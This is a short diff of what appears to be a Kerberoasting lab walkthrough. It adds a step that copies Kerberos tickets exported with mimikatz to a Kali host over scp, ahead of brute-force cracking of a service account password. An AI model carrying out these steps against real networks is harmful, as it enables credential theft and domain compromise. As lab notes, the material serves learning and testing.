@@ -727,7 +727,13 @@ mimikatz # kerberos::list /export
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
 ```
 
-### 3.1.3. Crack the ticket to retrieve service account password (brute force)
+### 3.1.3. Upload the ticket to Kali
+
+```console
+scp <ticket> kali@kali.vx:/home/kali/
+```
+
+### 3.1.4. Crack the ticket to retrieve service account password (brute force)
 
 ```console
 ┌──(kali㉿kali)-[~]
